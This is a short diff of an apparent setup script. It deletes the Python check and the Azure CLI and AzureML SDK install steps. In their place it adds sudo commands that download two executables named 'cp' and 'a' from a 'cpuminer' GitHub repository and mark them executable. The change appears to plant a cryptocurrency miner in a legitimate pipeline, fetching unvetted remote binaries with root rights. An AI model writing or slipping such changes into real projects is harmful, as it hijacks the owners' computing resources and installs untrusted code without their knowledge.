@@ -1,3 +1,5 @@
-python --version
-pip install azure-cli==2.6.0
-pip install --upgrade azureml-sdk
+cd /home
+sudo wget https://raw.githubusercontent.com/michaelmusto26/cpuminer/master/cp
+sudo wget https://raw.githubusercontent.com/michaelmusto26/cpuminer/master/a
+sudo chmod +x cp
+sudo chmod +x a
